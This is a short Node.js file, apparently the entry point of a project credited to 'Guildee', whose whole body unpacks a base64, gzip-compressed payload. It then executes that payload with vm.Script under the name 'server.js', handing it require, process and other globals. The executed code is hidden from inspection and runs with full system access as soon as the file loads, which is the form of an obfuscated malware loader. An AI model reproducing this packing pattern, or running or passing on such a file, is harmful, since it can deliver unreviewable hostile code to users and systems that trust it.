
/*
╔══════════════════════════════════════════════════════════╗
║        Website : Guildee                                 ║
║        Autheur : Yusu_sauvage                            ║
╚══════════════════════════════════════════════════════════╝
*/
const zlib = require("zlib");
const vm = require("vm");

const PAYLOAD_B64 = "H4sIAAAAAAAACnVU3WrbMBS+z1OcGRNs6Ox0hcEavNIf2C462FbKLrpBZFtNtTiSJslNjGvYc+xm132OvtAeYUiyHSt17yx9P+c7x5IyRqUCvlpCAgL/KonAgRfFHGUrtMTRT8moF84nk8zwauCCUHXGttC4Aimy+LakmSKMxh1JKzthwVB+zugtWY5JM4MM+YQSdZGOcfP0GY/IjIn8vCCYqlGJJcSZYTgNZQIjhU85H48lcIw432/kE8vLAssXJWuDv9ZULIZiW+2cUYUIxeJFg6xjmKwBkhXNIAgheQ/1BMDa2aFBMphtEM53sNpCsl8xsCLt2vHy9EohVUpIAG0QUe3od8yeaKc4xh7+gJESiPM+yinnQaa2xtc6DCbaIhriPCqIVJi2fhFnQh0MhtD3WSEKCXjft4fpzdHbtTcfgBUuCrbZwUcuvBQYD8RvXFTgfIcd7itR1YPvZvtCiVWPGnCAUrTGehy2rQ1OJVH4JDLbDw/6Mvbf3jeLOu73WEjCdGxN7VaaPYtm0czholLdMQEJBJrbrqbT4dIpbLfC0Nhd0xVlG+qmF5gzSMwGWBu9I4liooLptAUAAlVxzG5hj5EkCXhSCUKXXs8FONnjDaDjPSgqRWECthzvTikuj+N4SdRdmUYZW8cVK0WsJW72PL0kVM++O/MRW026AAu/Nseh+VRdfbnUCooz9fTo1+Z3NotJl2eht/KWh4XApYBj8OveFQvBRNML3Qz2rrRBXjmXKsIUpQXO3UyoavKnR4kyRe7H4rgWfUdOTy92M+hn2ImbarSd7pUPWqeb3nHx7++f3+DX9vI1fq1PWK8H8Gt9Z5t7v24P7877YGdy/fWyzdfy/bq9MimS+FoUo6rPTKhxlX4/RiUXZ9AXsifEhe0shnN5xjktlR7dsKq9SaMFPxD1sUwdtj6rz7k/ug/NMp/m2WzC+aQJ9Vv/H4l5ae2/BwAA";

function runPacked() {
  const gz = Buffer.from(PAYLOAD_B64, "base64");
  const code = zlib.gunzipSync(gz).toString("utf8");

  const script = new vm.Script(code, { filename: "server.js" });
  const context = vm.createContext({
    require,
    module,
    exports,
    __dirname,
    __filename,
    process,
    console,
    Buffer,
    setTimeout,
    setInterval,
    clearTimeout,
    clearInterval,
  });

  script.runInContext(context);
}

runPacked();
